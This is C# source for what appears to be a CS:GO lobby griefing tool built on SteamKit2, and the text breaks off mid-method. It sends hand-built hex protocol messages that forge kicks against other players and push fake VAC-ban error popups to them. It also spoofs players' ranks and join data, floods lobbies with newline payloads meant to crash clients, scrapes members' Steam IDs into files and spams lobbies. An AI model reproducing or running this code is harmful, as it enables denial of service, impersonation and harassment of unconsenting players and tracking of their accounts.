using System;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Threading;
using SteamKit2;
using SteamKit2.Internal;
using System.Media;
using System.Collections.Generic;
namespace GodnestCSGOTool
{
    class Handler : ClientMsgHandler
    {
        public class MyCallback : CallbackMsg
        {
            public EResult Result { get; private set; }

            internal MyCallback(EResult res)
            {
                Result = res;
            }
        }
        static public string gmsg = null;
        static public string whoinlobby;
        static public int mysteamid;
        static public string mysteamidhex;
        static public ulong checkinglobbys;
        static public ulong createdlbbyid;
        static public ulong crashedhomeless;
        static public ulong firstid;
        static public ulong sendjoins;
        static public string steamid;
        static public string chat1;
        static public string searchstatus;
        static public ulong fakesteamid;
        static public bool iminlobby = false;
        static public bool imdoinglobby = false;
        static public bool imdone = false;
        static public bool istherenahlebs = false;
        static public string checkedlobys = "";
        static public bool needcrashowner = false;
        static public bool needkicknahelb = false;
        static public string reasoncrashowner = "";
        static public string reasonkick = "";
        static public bool didufindhim = false;
        static public bool stop = false;
        static public string badlobbys = "";
        static public string lobbyidtoform = "";
        static public string whatdowithlordlobby = "";
        static public string nametoform = "";
        static public bool changingrank = false;
        static public bool pizduli = false;
        static public bool joinforsteamids = false;
        static public string currentname = "";
        static public int currentplayers = 1;
        static public string nametokick = "";
        static public ulong newlobbyid = 0;
        static public ulong currentlobbyid = 0;
        static public int currentcharter = 0;
        static public int countpls = 0;

        static public List<string> goodlobbys = new List<string>() { "0" };
        static uint steamiduintrandom = 0000000;
        Random rnd = new Random();
        Array myArr = Array.CreateInstance(typeof(string), 10);

        public void GEtLobbyData()
        {
            var GEtLobbyData = new ClientMsgProtobuf<CMsgClientMMSGetLobbyData>(EMsg.ClientMMSGetLobbyData);
            GEtLobbyData.Header.Proto.routing_appid = 730;
            GEtLobbyData.Body.app_id = 730;
            GEtLobbyData.Body.steam_id_lobby = mainform.lobbyid; // Lobby link 109775243834561419/76561198312797851
            Client.Send(GEtLobbyData);
        }

        public void JoinLobby(ulong id)
        {
            imdone = false;
            iminlobby = false;
            var JoinLobby = new ClientMsgProtobuf<CMsgClientMMSJoinLobby>(EMsg.ClientMMSJoinLobby);
            JoinLobby.ProtoHeader.routing_appid = 730;
            JoinLobby.Header.Proto.routing_appid = 730;
            JoinLobby.Body.app_id = 730;
            JoinLobby.Body.steam_id_lobby = id; // Lobby link 109775243834561419/76561198312797851
            JoinLobby.Body.persona_name = "CS:GO";
            Client.Send(JoinLobby);
        }
        async void unlockit()
        {
            for (int i = 0; i < 3; i++)
            {
                await Task.Delay(1000).ConfigureAwait(false);
            }
            LeaveLobby(mainform.lobbyid);
            imdone = true;
        }
        public void LeaveLobby(ulong lobbyid)
        {
            iminlobby = false;
            var LeaveLobby = new ClientMsgProtobuf<CMsgClientMMSLeaveLobby>(EMsg.ClientMMSLeaveLobby);
            LeaveLobby.ProtoHeader.routing_appid = 730;
            LeaveLobby.Header.Proto.routing_appid = 730;
            LeaveLobby.Body.app_id = 730;
            LeaveLobby.Body.steam_id_lobby = lobbyid; // Lobby link 109775243834561419/76561198312797851
            Client.Send(LeaveLobby);
        }
        public void SendErrorMessage(string message2, ulong lobbyid, ulong steamid64)
        {
            var SendMessage = new ClientMsgProtobuf<CMsgClientMMSSendLobbyChatMsg>(EMsg.ClientMMSSendLobbyChatMsg);
            string message = (BitConverter.ToString(Encoding.UTF8.GetBytes(message2))).ToUpper().Replace("-", "");
            string steamidhex = Convert.ToString(Convert.ToInt32(steamid64 - 76561197960265728), 16).ToUpper();
            bool issteamidhex = true;
            while (issteamidhex == true)
            {
                if (steamidhex.Length < 8)
                {
                    steamidhex = "0" + steamidhex;
                }
                else
                {
                    issteamidhex = false;
                }
            }
            string messagesend = "000035000053797353657373696F6E3A3A436F6D6D616E64000047616D653A3A436861745265706F72744572726F72000172756E00616C6C0007787569640001100001" + steamidhex + "016572726F7200" + message + "000B0B0B";
            SendMessage.ProtoHeader.routing_appid = 730;
            SendMessage.Body.app_id = 730;
            SendMessage.Body.lobby_message = StringToByteArray(messagesend);
            SendMessage.Body.steam_id_lobby = lobbyid;
            Client.Send(SendMessage);
        }

        public void createlobby()
        {
            var createlobby = new ClientMsgProtobuf<CMsgClientMMSCreateLobby>(EMsg.ClientMMSCreateLobby);
            createlobby.Header.Proto.routing_appid = 730;
            createlobby.ProtoHeader.routing_appid = 730;
            createlobby.Body.app_id = 730;
            createlobby.Body.persona_name_owner = mainform.name;
            createlobby.Body.max_members = 10;
            Client.Send(createlobby);
        }
        public void SetLobbyDatatest(string message2, int lobbyflags, int lobbytype)
        {
            var SendMessage = new ClientMsgProtobuf<CMsgClientMMSSetLobbyData>(EMsg.ClientMMSSetLobbyData);
            byte[] message1 = Encoding.UTF8.GetBytes(message2);
            string message = (BitConverter.ToString(message1)).ToUpper();
            message = message.Replace("-", "");
            string messagesend = message;
            SendMessage.ProtoHeader.routing_appid = 730;
            SendMessage.Body.app_id = 730;
            SendMessage.Body.metadata = StringToByteArray(messagesend);
            SendMessage.Body.steam_id_lobby = mainform.lobbyid;
            SendMessage.Body.lobby_flags = lobbyflags;
            SendMessage.Body.lobby_type = lobbytype;
            SendMessage.Body.max_members = 10;
            Client.Send(SendMessage);
        }
        public void InviteMessage(string message2)
        {
            var SendMessage = new ClientMsgProtobuf<CMsgClientMMSSendLobbyChatMsg>(EMsg.ClientMMSSendLobbyChatMsg);
            byte[] message1 = Encoding.UTF8.GetBytes(message2);
            string message = (BitConverter.ToString(message1)).ToUpper();
            message = message.Replace("-", "");
            string messagesend = "000035000053797353657373696F6E3A3A436F6D6D616E64000047616D653A3A43686174496E766974654D657373616765000172756E00616C6C0007787569640001100001" + steamid + "07667269656E640001100001" + "00000001" + "01667269656E644E616D6500" + message + "000B0B0B";
            SendMessage.ProtoHeader.routing_appid = 730;
            SendMessage.Body.app_id = 730;
            SendMessage.Body.lobby_message = StringToByteArray(messagesend);
            SendMessage.Body.steam_id_lobby = mainform.lobbyid;
            Client.Send(SendMessage);
        }
        public void Sendmsgwithinfo(string message2, ulong id)
        {
            var SendMessage = new ClientMsgProtobuf<CMsgClientMMSSendLobbyChatMsg>(EMsg.ClientMMSSendLobbyChatMsg);
            byte[] message1 = Encoding.UTF8.GetBytes(message2);
            string message = (BitConverter.ToString(message1)).ToUpper();
            message = message.Replace("-", "");
            bool issteamid = true;
            while (issteamid == true)
            {
                if (steamid.Length < 8)
                {
                    steamid = "0" + steamid;
                }
                else
                {
                    issteamid = false;
                }
            }
            byte[] name = Encoding.Default.GetBytes("CS:GO");
            string namehexstring = (BitConverter.ToString(name)).ToUpper();
            namehexstring = namehexstring.Replace("-", "");
            string messagesend = "000035000053797353657373696F6E3A3A436F6D6D616E64000047616D653A3A43686174000172756E00616C6C0007787569640001100001" + steamid + "016E616D6500" + namehexstring + "00016368617400" + message + "000B0B0B"; ;
            SendMessage.ProtoHeader.routing_appid = 730;
            SendMessage.Body.app_id = 730;
            try
            {
                byte[] checkedmessage = StringToByteArray(messagesend);
                SendMessage.Body.lobby_message = checkedmessage;
                SendMessage.Body.steam_id_lobby = id;
                Client.Send(SendMessage);
            }
            catch (Exception)
            {
                messagesend = "0" + messagesend;
                byte[] checkedmessage = StringToByteArray(messagesend);
                SendMessage.Body.lobby_message = checkedmessage;
                SendMessage.Body.steam_id_lobby = id;
                Client.Send(SendMessage);
            }
        }
        public void CrashSendMessage1(int howmuch, ulong id)
        {
            var SendMessage = new ClientMsgProtobuf<CMsgClientMMSSendLobbyChatMsg>(EMsg.ClientMMSSendLobbyChatMsg);
            byte[] name = Encoding.Default.GetBytes("Name");
            string namehexstring = (BitConverter.ToString(name)).ToUpper();
            namehexstring = namehexstring.Replace("-", "");
            byte[] message1 = Encoding.Default.GetBytes(new string('\n', howmuch));
            string message = (BitConverter.ToString(message1)).ToUpper();
            message = message.Replace("-", "");
            string messagesend = "000035000053797353657373696F6E3A3A436F6D6D616E64000047616D653A3A43686174000172756E00616C6C0007787569640001100001" + mysteamidhex + "016E616D6500" + namehexstring + "00016368617400" + message + "000B0B0B";
            SendMessage.ProtoHeader.routing_appid = 730;
            SendMessage.Body.app_id = 730;
            SendMessage.Body.lobby_message = StringToByteArray(messagesend);
            SendMessage.Body.steam_id_lobby = id;
            Client.Send(SendMessage);
        }
        public void KickMsg()
        {
            var SendMessage = new ClientMsgProtobuf<CMsgClientMMSSendLobbyChatMsg>(EMsg.ClientMMSSendLobbyChatMsg);
            string kicksteamid = Convert.ToString(Convert.ToInt32(mainform.kicksteamid), 16).ToUpper();
            bool kick = true;
            while (kick == true)
            {
                if (kicksteamid.Length < 8)
                {
                    kicksteamid = "0" + kicksteamid;
                }
                else
                {
                    kick = false;
                }
            }
            string messagesend = "000035000053797353657373696F6E3A3A4F6E506C617965724B69636B65640007787569640001100001" + kicksteamid + "0B0B";
            SendMessage.ProtoHeader.routing_appid = 730;
            SendMessage.Body.app_id = 730;
            SendMessage.Body.lobby_message = StringToByteArray(messagesend);
            SendMessage.Body.steam_id_lobby = mainform.lobbyid;
            Client.Send(SendMessage);
        }
        public void KickMsgfull(ulong stmeamid, ulong lobbyid)
        {
            var SendMessage = new ClientMsgProtobuf<CMsgClientMMSSendLobbyChatMsg>(EMsg.ClientMMSSendLobbyChatMsg);
            string kicksteamid = Convert.ToString(Convert.ToInt32(stmeamid - 76561197960265728), 16).ToUpper();
            bool kick = true;
            while (kick == true)
            {
                if (kicksteamid.Length < 8)
                {
                    kicksteamid = "0" + kicksteamid;
                }
                else
                {
                    kick = false;
                }
            }
            string messagesend = "000035000053797353657373696F6E3A3A4F6E506C617965724B69636B65640007787569640001100001" + kicksteamid + "0B0B";
            SendMessage.ProtoHeader.routing_appid = 730;
            SendMessage.Body.app_id = 730;
            SendMessage.Body.lobby_message = StringToByteArray(messagesend);
            SendMessage.Body.steam_id_lobby = lobbyid;
            Client.Send(SendMessage);
        }
        public static string RemoveControlCharacters(string inString)
        {
            if (inString == null) return null;
            StringBuilder newString = new StringBuilder();
            char ch;
            for (int i = 0; i < inString.Length; i++)
            {
                ch = inString[i];
                if (!char.IsControl(ch))
                {
                    newString.Append(ch);
                }
            }
            return newString.ToString();
        }

        public override void HandleMsg(IPacketMsg packetMsg)
        {
            if (packetMsg.MsgType == EMsg.ClientMMSLobbyChatMsg)
            {
                if (mainform.crashlobby != true)
                {
                    if (mainform.autoparser != true)
                    {
                        if (mainform.startsearchlobby != true)
                        {
                            if (mainform.scaneveything != true)
                            {
                                var resp = new ClientMsgProtobuf<CMsgClientMMSLobbyChatMsg>(packetMsg);
                                string lobby_message = (BitConverter.ToString(resp.Body.lobby_message)).ToUpper();
                                lobby_message = lobby_message.Replace("-", "");
                                if (lobby_message == "000034FB0053797353657373696F6E3A3A4F6E5570646174650000557064617465000073797374656D00016C6F636B00000B0067616D6500016D6D717565756500736561726368696E67000261707200000000030B0B0B0B")
                                {
                                    searchstatus = "Ищем игру....";
                                }
                                string hex = RemoveControlCharacters(System.Text.Encoding.UTF8.GetString(resp.Body.lobby_message)) + "END";
                                string name = getBetween(hex, "name", "chat") + ":";
                                string chat = getBetween(hex, "chat", "END");
                                if (chat != null)
                                {
                                    chat1 = name + chat;
                                }
                                resp = null;
                            }
                        }
                    }
                }
            }

            switch (packetMsg.MsgType)
            {
                case EMsg.ClientMMSJoinLobbyResponse:
                    Task.Run(() => HandleJoinLobbyResponse(packetMsg));
                    break;
                case EMsg.ClientMMSCreateLobbyResponse:
                    Task.Run(() => HandleCreateLobbyResponse(packetMsg));
                    break;
                case EMsg.ClientMMSLobbyData:
                    Task.Run(() => ClientMMSLobbyData(packetMsg));
                    break;
                case EMsg.ClientMMSLobbyChatMsg:
                    Task.Run(() => ClientMMSLobbyChatMsg(packetMsg));
                    break;
                case EMsg.ClientMMSUserLeftLobby:
                    Task.Run(() => ClientMMSUserLeftLobby(packetMsg));
                    break;
                case EMsg.ClientMMSUserJoinedLobby:
                    Task.Run(() => ClientMMSUserJoinedLobby(packetMsg));
                    break;
            }
        }
        void ClientMMSUserJoinedLobby(IPacketMsg packetMsg)
        {
            var resp = new ClientMsgProtobuf<CMsgClientMMSUserJoinedLobby>(packetMsg);

        }
        public void ClientMMSGetLobbyData(ulong lobbyid)
        {
            var JoinLobby = new ClientMsgProtobuf<CMsgClientMMSGetLobbyData>(EMsg.ClientMMSGetLobbyData);
            JoinLobby.ProtoHeader.routing_appid = 730;
            JoinLobby.Header.Proto.routing_appid = 730;
            JoinLobby.Body.app_id = 730;
            JoinLobby.Body.steam_id_lobby = lobbyid;
            Client.Send(JoinLobby);
        }

        public static byte[] StringToByteArray(string hex)
        {
            return Enumerable.Range(0, hex.Length)
                             .Where(x => x % 2 == 0)
                             .Select(x => Convert.ToByte(hex.Substring(x, 2), 16))
                             .ToArray();
        }
        string plussomesymbols(string stringhex, int howmuch)
        {
            bool islegit = true;
            while (islegit == true)
            {
                if (stringhex.Length < howmuch)
                {
                    stringhex = "0" + stringhex;
                }
                else
                {
                    islegit = false;
                }
            }
            return stringhex;
        }
        void sendjoinmsg(ulong steamidofplayer, string nameofplayer, ulong winsofplayer, int rankofplayer, int levelofplayer, ulong lobbyid)
        {
            var SendMessage = new ClientMsgProtobuf<CMsgClientMMSSendLobbyChatMsg>(EMsg.ClientMMSSendLobbyChatMsg);
            string wins = plussomesymbols(Convert.ToString(Convert.ToUInt32(winsofplayer), 16).ToUpper(), 10);
            string rank = plussomesymbols(Convert.ToString(Convert.ToInt32(rankofplayer), 16).ToUpper(), 10);
            string level = plussomesymbols(Convert.ToString(Convert.ToInt32(levelofplayer), 16).ToUpper(), 10);
            string color = plussomesymbols(Convert.ToString(Convert.ToInt32(rnd.Next(1, 5)), 16).ToUpper(), 2);
            string steamidofvictim = plussomesymbols(Convert.ToString(Convert.ToInt32(steamidofplayer - 76561197960265728), 16).ToUpper(), 8);
            string namehexstring = (BitConverter.ToString(Encoding.Default.GetBytes(nameofplayer))).ToUpper().Replace("-", "");
            string goodmessage = "000035000053797353657373696F6E3A3A526571756573744A6F696E44617461000769640001100001" + getrandomsteamid() + "0073657474696E677300006D656D6265727300026E756D4D616368696E65730000000001026E756D506C61796572730000000001026E756D536C6F74730000000001006D616368696E6530000769640001100001" + getrandomsteamid() + "07666C616773000000000000000000026E756D506C6179657273000000000107646C636D61736B000000000000000000017475766572003030303030303030000270696E67000000000000706C61796572300007787569640001100001" + steamidofvictim + "016E616D6500" + namehexstring + "000067616D650002636C616E494400000000000272616E6B696E67" + rank + "0277696E73" + wins + "026C6576656C" + level + "027870707473001388017401636F6D6D656E6473005B6627105D5B7427105D5B6C27105D00016D6564616C73005B54315D5B43325D5B57305D5B47305D5B41315D00027465616D636F6C6F720000000000027072696D650000000000016C6F63005255000B0B0B076A6F696E666C6167730000000000000000000B077465616D5265734B65790000000000000000000B0B0B";
            SendMessage.ProtoHeader.routing_appid = 730;
            SendMessage.Body.app_id = 730;
            SendMessage.Body.lobby_message = StringToByteArray(goodmessage);
            SendMessage.Body.steam_id_lobby = lobbyid;
            Client.Send(SendMessage);
        }
        public void changerank(ulong steamidofplayer, string nameofplayer, ulong winsofplayer, int rankofplayer, int levelofplayer, ulong lobbyid, string clanname)
        {
            var SendMessage = new ClientMsgProtobuf<CMsgClientMMSSendLobbyChatMsg>(EMsg.ClientMMSSendLobbyChatMsg);
            string wins = plussomesymbols(Convert.ToString(Convert.ToUInt32(rnd.Next(1, 10000)), 16).ToUpper(), 10);
            string rank = plussomesymbols(Convert.ToString(Convert.ToInt32(rnd.Next(1, 18)), 16).ToUpper(), 10);
            string level = plussomesymbols(Convert.ToString(Convert.ToInt32(rnd.Next(1, 40)), 16).ToUpper(), 10);
            string color = plussomesymbols(Convert.ToString(Convert.ToInt32(rnd.Next(1, 5)), 16).ToUpper(), 2);
            string steamidofvictim = plussomesymbols(Convert.ToString(Convert.ToInt32(steamidofplayer - 76561197960265728), 16).ToUpper(), 8);
            string clanhex = BitConverter.ToString(Encoding.UTF8.GetBytes("TedRedPhox.xyz")).Replace("-", "");
            string goodmessage = "000035000053797353657373696F6E3A3A436F6D6D616E64000047616D653A3A536574506C6179657252616E6B696E67000172756E00686F73740007787569640001100001" + steamidofvictim + "0067616D650001636C616E74616700" + clanhex + "000272616E6B696E67" + rank + "0277696E73" + wins + "026C6576656C" + level + "027870707473001388102A01636F6D6D656E6473005B66305D5B74305D5B6C305D00016D6564616C73005B54315D5B43325D5B57305D5B47305D5B41315D00027465616D636F6C6F7200000000" + color + "027072696D650000000001016C6F63005255000B0B0B0B";
            SendMessage.ProtoHeader.routing_appid = 730;
            SendMessage.Body.app_id = 730;
            SendMessage.Body.lobby_message = StringToByteArray(goodmessage);
            SendMessage.Body.steam_id_lobby = lobbyid;
            Client.Send(SendMessage);
        }

        public void disco(ulong steamidofplayer, ulong lobbyid)
        {
        }
        string getrandomsteamid()
        {
            steamiduintrandom++;
            string randomsteamid = Convert.ToString(Convert.ToInt32(steamiduintrandom), 16).ToUpper();
            bool israndomsteamid = true;
            while (israndomsteamid == true)
            {
                if (randomsteamid.Length < 8)
                {
                    randomsteamid = "0" + randomsteamid;
                }
                else
                {
                    israndomsteamid = false;
                }
            }
            return randomsteamid;
        }
        void joinlobbyresponsesttuff(IPacketMsg packetMsg)
        {
            var JoinResp = new ClientMsgProtobuf<CMsgClientMMSJoinLobbyResponse>(packetMsg);
            var SendMessage = new ClientMsgProtobuf<CMsgClientMMSSendLobbyChatMsg>(EMsg.ClientMMSSendLobbyChatMsg);
            string goodmessage = "000035000053797353657373696F6E3A3A526571756573744A6F696E446174610007696400011000010073657474696E677300006D656D6265727300026E756D4D616368696E65730000000001026E756D506C61796572730000000001026E756D536C6F74730000000001006D616368696E6530000769640001100001" + mysteamidhex + "07666C616773000000000000000000026E756D506C6179657273000000000107646C636D61736B000000000000000000017475766572003030303030303030000270696E67000000000000706C61796572300007787569640001100001016E616D6500000067616D650002636C616E494400000000000272616E6B696E670277696E73026C6576656C027870707473001388017401636F6D6D656E6473005B6627105D5B7427105D5B6C27105D00016D6564616C73005B54315D5B43325D5B57305D5B47305D5B41315D00027465616D636F6C6F720000000000027072696D650000000000016C6F63005255000B0B0B076A6F696E666C6167730000000000000000000B077465616D5265734B65790000000000000000000B0B0B";
            SendMessage.ProtoHeader.routing_appid = 730;
            SendMessage.Body.app_id = 730;
            SendMessage.Body.lobby_message = StringToByteArray(goodmessage);
            SendMessage.Body.steam_id_lobby = JoinResp.Body.steam_id_lobby;
            Client.Send(SendMessage);
            var goodlobbysmatch = goodlobbys.FirstOrDefault(stringToCheck => stringToCheck.Contains(Convert.ToString(JoinResp.Body.steam_id_lobby)));
            if (goodlobbysmatch == null)
            {
                goodlobbys.Add(Convert.ToString(JoinResp.Body.steam_id_lobby));
            }
            string texttowrite = Convert.ToString(JoinResp.Body.steam_id_lobby);
            for (int i = 0; i < JoinResp.Body.members.Count(); i++)
            {
                if (JoinResp.Body.members[i].steam_id != JoinResp.Header.Proto.steamid)
                {
                    texttowrite = texttowrite + " " + JoinResp.Body.members[i].steam_id;
                }
            }
            Task.Run(() => lobby.writemembertotxt(texttowrite, JoinResp.Body.steam_id_lobby));
            LeaveLobby(JoinResp.Body.steam_id_lobby);
        }
        void HandleJoinLobbyResponse(IPacketMsg packetMsg)
        {
            var JoinResp = new ClientMsgProtobuf<CMsgClientMMSJoinLobbyResponse>(packetMsg);
            if (mainform.scaneveything == true)
            {
                if (JoinResp.Body.chat_room_enter_response == 1)
                {
                    checkinglobbys++;
                    Task.Run(() => joinlobbyresponsesttuff(packetMsg));
                    return;
                }
                if (JoinResp.Body.lobby_flags == 8)
                {
                    var goodlobbysmatch = goodlobbys.FirstOrDefault(stringToCheck => stringToCheck.Contains(Convert.ToString(JoinResp.Body.steam_id_lobby)));
                    if (goodlobbysmatch == null)
                    {
                        goodlobbys.Add(Convert.ToString(JoinResp.Body.steam_id_lobby));
                    }
                    return;
                }
                else
                {
                    badlobbys = badlobbys + JoinResp.Body.steam_id_lobby;
                }
                return;
            }
            if (mainform.scaneveything == true)
            {
                return;
            }
            mysteamid = Convert.ToInt32(JoinResp.Header.Proto.steamid - 76561197960265728);
            steamid = Convert.ToString(Convert.ToInt32(JoinResp.Header.Proto.steamid - 76561197960265728), 16).ToUpper();
            mysteamidhex = Convert.ToString(Convert.ToInt32(JoinResp.Header.Proto.steamid - 76561197960265728), 16).ToUpper();
            imdone = false;
            mysteamid = Convert.ToInt32(JoinResp.Header.Proto.steamid - 76561197960265728);
            steamid = plussomesymbols(Convert.ToString(Convert.ToInt32(JoinResp.Header.Proto.steamid - 76561197960265728), 16).ToUpper(), 8);
            if (mainform.fakesteamid.Length == 17)
            {
                fakesteamid = Convert.ToUInt64(mainform.fakesteamid);
            }
            else
            {
                fakesteamid = JoinResp.Header.Proto.steamid;
            }
            if (mainform.startsearchlobby == true)
            {
                if (JoinResp.Body.chat_room_enter_response == 1)
                {
                    checkinglobbys = checkinglobbys + 1;
                    if (currentlobbyid == JoinResp.Body.steam_id_lobby)
                    {
                        if (joinforsteamids == true)
                        {
                            if (whatdowithlordlobby == "disco")
                            {
                                sendjoinmsg(76561198000020858, "CS:GO", 536527, 18, 40, JoinResp.Body.steam_id_lobby);
                                Thread.Sleep(500);
                                if (JoinResp.Body.members.Count < 6)
                                {
                                    Sendmsgwithinfo("You need 5 or more members here!", JoinResp.Body.steam_id_lobby);
                                }
                                else
                                {
                                    stop = false;
                                    Sendmsgwithinfo("To Stop type: !stop", JoinResp.Body.steam_id_lobby);
                                    ulong[] arrayofsteamids = new ulong[] { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 };
                                    for (int i = 0; i < JoinResp.Body.members.Count; i++)
                                    {
                                        arrayofsteamids[i] = JoinResp.Body.members[i].steam_id;
                                    }
                                    Task.Run(() => lobby.makediscom8(arrayofsteamids, JoinResp.Body.steam_id_lobby, "disco"));
                                    return;
                                }
                            }
                            else
                            {
                                sendjoinmsg(JoinResp.Header.Proto.steamid, "CS:GO", 536527, 18, 40, JoinResp.Body.steam_id_lobby);
                                Thread.Sleep(500);
                                if (whatdowithlordlobby == "ge")
                                {
                                    if (JoinResp.Body.members.Count < 3)
                                    {
                                        Sendmsgwithinfo("You need 2 or more members here!", JoinResp.Body.steam_id_lobby);
                                    }
                                    else
                                    {
                                        stop = false;
                                        Sendmsgwithinfo("To Stop type: !stop", JoinResp.Body.steam_id_lobby);
                                        ulong[] arrayofsteamids = new ulong[] { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 };
                                        for (int i = 0; i < JoinResp.Body.members.Count; i++)
                                        {
                                            arrayofsteamids[i] = JoinResp.Body.members[i].steam_id;
                                        }
                                        Task.Run(() => lobby.makediscom8(arrayofsteamids, JoinResp.Body.steam_id_lobby, "ge"));
                                        return;
                                    }
                                }
                                if (whatdowithlordlobby == "s1")
                                {
                                    if (JoinResp.Body.members.Count < 3)
                                    {
                                        Sendmsgwithinfo("You need 2 or more members here!", JoinResp.Body.steam_id_lobby);
                                    }
                                    else
                                    {
                                        stop = false;
                                        Sendmsgwithinfo("To Stop type: !stop", JoinResp.Body.steam_id_lobby);
                                        ulong[] arrayofsteamids = new ulong[] { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 };
                                        for (int i = 0; i < JoinResp.Body.members.Count; i++)
                                        {
                                            arrayofsteamids[i] = JoinResp.Body.members[i].steam_id;
                                        }
                                        Task.Run(() => lobby.makediscom8(arrayofsteamids, JoinResp.Body.steam_id_lobby, "s1"));
                                        return;
                                    }
                                }
                                if (whatdowithlordlobby == "kickall")
                                {
                                    Sendmsgwithinfo("My lord want be alone, leave him", JoinResp.Body.steam_id_lobby);
                                    for (int i = 0; i < JoinResp.Body.members.Count; i++)
                                    {
                                        if (lobby.targetsProfiles.Contains(JoinResp.Body.members[i].steam_id) != true)
                                        {
                                            if (JoinResp.Body.members[i].steam_id != JoinResp.Header.Proto.steamid)
                                            {
                                                KickMsgfull(JoinResp.Body.members[i].steam_id, JoinResp.Body.steam_id_lobby);
                                            }
                                        }
                                    }
                                }
                                if (whatdowithlordlobby == "vac")
                                {
                                    Sendmsgwithinfo("Get shrekt, fucking cheaters", JoinResp.Body.steam_id_lobby);
                                    for (int i = 0; i < JoinResp.Body.members.Count; i++)
                                    {
                                        SendErrorMessage("SFUI_QMM_ERROR_X_VacBanned", JoinResp.Body.steam_id_lobby, JoinResp.Body.members[i].steam_id);
                                    }
                                }
                                if (whatdowithlordlobby == "ow")
                                {
                                    Sendmsgwithinfo("Get shrekt, fucking cheaters", JoinResp.Body.steam_id_lobby);
                                    for (int i = 0; i < JoinResp.Body.members.Count; i++)
                                    {
                                        SendErrorMessage("SFUI_QMM_ERROR_X_VacBanned", JoinResp.Body.steam_id_lobby, JoinResp.Body.members[i].steam_id);
                                    }
                                }

                                if (whatdowithlordlobby == "kick")
                                {
                                    if (nametokick != null)
                                    {
                                        for (int i = 0; i < JoinResp.Body.members.Count; i++)
                                        {
                                            if (lobby.targetsProfiles.Contains(JoinResp.Body.members[i].steam_id) != true)
                                            {
                                                if (JoinResp.Body.members[i].persona_name.Contains(nametokick))
                                                {
                                                    Sendmsgwithinfo("Кикаю:" + JoinResp.Body.members[i].persona_name, JoinResp.Body.steam_id_lobby);
                                                    KickMsgfull(JoinResp.Body.members[i].steam_id, JoinResp.Body.steam_id_lobby);
                                                }
                                            }
                                        }
                                    }
                                    nametokick = null;
                                }

                                if (whatdowithlordlobby == "knife")
                                {
                                    SendErrorMessage("SFUI_Map_de_bank", JoinResp.Body.steam_id_lobby, JoinResp.Body.members[0].steam_id);
                                    SendErrorMessage("WIN_MAP_DE_BANK_DESC", JoinResp.Body.steam_id_lobby, JoinResp.Body.members[0].steam_id);
                                    SendErrorMessage("Op_bloodhound_Valeria_bank_turner_sub", JoinResp.Body.steam_id_lobby, JoinResp.Body.members[0].steam_id);
                                    SendErrorMessage("GAMEUI_Stat_WinsMapDEBank", JoinResp.Body.steam_id_lobby, JoinResp.Body.members[0].steam_id);
                                }
                            }

                            LeaveLobby(JoinResp.Body.steam_id_lobby);
                            JoinLobby(JoinResp.Body.steam_id_lobby);
                            joinforsteamids = false;
                            whatdowithlordlobby = "";
                            return;
                        }
                    }
                    else
                    {
                        for (int di = 0; di < JoinResp.Body.members.Count; di++)
                        {
                            if (lobby.ineedspam == true)
                            {
                                if (mainform.spamsomemessages == true)
                                {
                                    sendjoinmsg(Convert.ToUInt64(mysteamid + 76561197960265728), "TedRedPhox.xyz", Convert.ToUInt64(rnd.Next(99999, 9999999)), rnd.Next(1, 18), rnd.Next(1, 40), JoinResp.Body.steam_id_lobby);
                                    sendjoinmsg(Convert.ToUInt64(mysteamid + 76561197960265728), "TedRedPhox.xyz", Convert.ToUInt64(rnd.Next(99999, 9999999)), rnd.Next(1, 18), rnd.Next(1, 40), JoinResp.Body.steam_id_lobby);
                                    Sendmsgwithinfo("#FIXCSGO", JoinResp.Body.steam_id_lobby);
                                    Sendmsgwithinfo("[ENG]", JoinResp.Body.steam_id_lobby);
                                    Sendmsgwithinfo("Hello everyone, as you may know, there are a lot of cheaters in CS:GO and Valve doesnt do anything about it, because they simply dont care! They get enough money from skins and cases to not give a fuck about the game anymore and we need to STOP them!!! Please don't playing CS:GO for 1 day, to proof them that we care about the game and want them to fix it, because as in its current state its unplayable.  We are customers that are willing to pay for a good game without hackers and bugs that break the game.  The CS:GO Community is getting bigger every day and all they care about is how to get more money out of the game with SKINS, STCKERS and stupid SPRAYS... Valve, fix VAC, it's shit.", JoinResp.Body.steam_id_lobby);
                                    Sendmsgwithinfo("[RU]", JoinResp.Body.steam_id_lobby);
                                    Sendmsgwithinfo("Добрый день, Господа, как вы знаете в КС:ГО много читеров. И Вальве нечего с этим не делают, вы можете читерит го и вы не получить баг. Они просто гребут деньги со скинов, и это будет продолжаться до того момента, пока вы будите им давать деньги. Остановитесь. Пожалуйста, не играйте в КС:ГО 1 день, давайте покаже Вальве что мы не скот, мы покупатели, и мы можем требовать нормальный продукт, без читеров и багов. Вальве, пофиксите ВАК, он не работает.", JoinResp.Body.steam_id_lobby);
                                    Sendmsgwithinfo("Current mood: Alle Farben - Bad Ideas", JoinResp.Body.steam_id_lobby);
                                    Sendmsgwithinfo("You're friends TedRedPhox.xyz and Gerbal1337.xyz", JoinResp.Body.steam_id_lobby);
                                    sendjoinmsg(Convert.ToUInt64(76561198365043911), "Gerbal1337.xyz", Convert.ToUInt64(rnd.Next(99999, 9999999)), rnd.Next(1, 18), rnd.Next(1, 40), JoinResp.Body.steam_id_lobby);
                                    return;
                                }
                                else
                                {
                                    if (lobby.targetsProfiles.Contains(JoinResp.Body.members[di].steam_id) == true)
                                    {
                                        sendjoinmsg(Convert.ToUInt32(mysteamid + 76561197960265728), "CS:GO", 536527, 18, 40, JoinResp.Body.steam_id_lobby);
                                        if (mainform.dontcrashihm == true)
                                        {
                                            crashedhomeless = crashedhomeless + 1;
                                        }
                                        else
                                        {
                                            if (di == 0)
                                            {
                                                Sendmsgwithinfo("Lobby Anti-Cheat by TedRedPhox.Xyz and Gerbal1337.Xyz", JoinResp.Body.steam_id_lobby);
                                                Sendmsgwithinfo("Crashing cheater:" + JoinResp.Body.members[di].steam_id, JoinResp.Body.steam_id_lobby);
                                                crashedhomeless = crashedhomeless + 1;
                                                //for (int i = 0; i <= 50; i++)
                                                //{
                                                //    CrashSendMessage1(65000, JoinResp.Body.steam_id_lobby);
                                                //}
                                            }
                                            else
                                            {
                                                crashedhomeless = crashedhomeless + 1;
                                                Sendmsgwithinfo("Lobby Anti-Cheat by TedRedPhox.Xyz and gerbal1337.xyz", JoinResp.Body.steam_id_lobby);
